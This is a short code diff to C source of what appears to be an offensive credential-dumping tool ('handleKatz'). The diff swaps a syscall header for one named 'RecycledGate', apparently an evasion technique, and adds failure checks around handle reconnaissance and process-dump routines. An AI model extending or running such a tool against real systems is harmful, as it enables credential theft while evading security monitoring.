@@ -4,7 +4,7 @@
 #include "DumpTools.h"
 #include "HandleTools.h"
 #include "Misc.h"
-#include "syscalls.h"
+#include "RecycledGate.h"
 
 DWORD dump(DWORD, char*, char*, struct fPtrs*);
 DWORD recon(char*, struct fPtrs*);
@@ -47,6 +47,8 @@ handleKatz(BOOL b_only_recon, char* ptr_output_path, uint32_t pid, char* ptr_buf
         ptrs_functions._lstrcatA((char*)ptr_buf_output, msg_do_recon);
 
         dw_success = recon((char*)ptr_buf_output, &ptrs_functions);
+        if(dw_success == FAIL)
+            goto cleanup;
 
     } else {
 
@@ -63,6 +65,8 @@ handleKatz(BOOL b_only_recon, char* ptr_output_path, uint32_t pid, char* ptr_buf
         ptrs_functions._lstrcatA((char*)ptr_buf_output, line_1);
 
         dw_success = dump(pid, (char*)ptr_buf_output, ptr_output_path, &ptrs_functions);
+        if(dw_success == FAIL)
+            goto cleanup;
 
     }
 
@@ -140,6 +144,7 @@ recon(char* ptr_output, struct fPtrs* ptrs_functions) {
 
     PSYSTEM_HANDLE_INFORMATION handle_info = NULL;
     DWORD dw_success = FALSE;
+    HANDLE hCheck = NULL;
 
     handle_info = get_handles(ptrs_functions);
     if (handle_info == NULL) {
@@ -150,7 +155,9 @@ recon(char* ptr_output, struct fPtrs* ptrs_functions) {
 
     }
 
-    check_handles(handle_info, 0, ptr_output, ptrs_functions);
+    hCheck = check_handles(handle_info, 0, ptr_output, ptrs_functions);
+    if(hCheck == FAIL)
+        goto cleanup;
 
     dw_success = SUCCESS;
 
